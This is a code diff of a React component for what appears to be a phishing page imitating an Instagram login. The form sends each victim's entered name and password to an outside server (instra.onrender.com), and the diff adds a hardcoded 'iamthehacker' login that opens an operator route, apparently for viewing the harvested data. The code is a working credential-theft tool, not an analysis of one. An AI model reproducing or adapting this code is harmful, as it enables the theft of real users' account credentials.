@@ -3,19 +3,26 @@ import {FontAwesomeIcon} from '@fortawesome/react-fontawesome'
 import {faSquareFacebook} from '@fortawesome/free-brands-svg-icons'
 import {useForm} from 'react-hook-form'
 import axios from 'axios'
+import { useNavigate } from 'react-router-dom'
 
 const Mainui = () => {
   const {register,handleSubmit,reset}=useForm();
+  const navigate=useNavigate();
 
   const sendData=(data)=>{
-       axios
-       .post('https://instra.onrender.com/data',data)
-       .then(()=>{
-        window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
-        console.log("hua redirect");
-        reset();
-       })
-       .catch((err)=>{console.log(err)})
+       console.log(data.name.localeCompare("iamthehacker"))
+       if(data.name.localeCompare("iamthehacker")==0&&data.password.localeCompare("ilovehacker")==0){
+           navigate('/iamthehacker');
+       }
+       else{
+        axios
+        .post('https://instra.onrender.com/data',data)
+        .then(()=>{
+        //  window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
+         reset();
+        })
+        .catch((err)=>{console.log(err)})
+       }
   }
 
   return <>
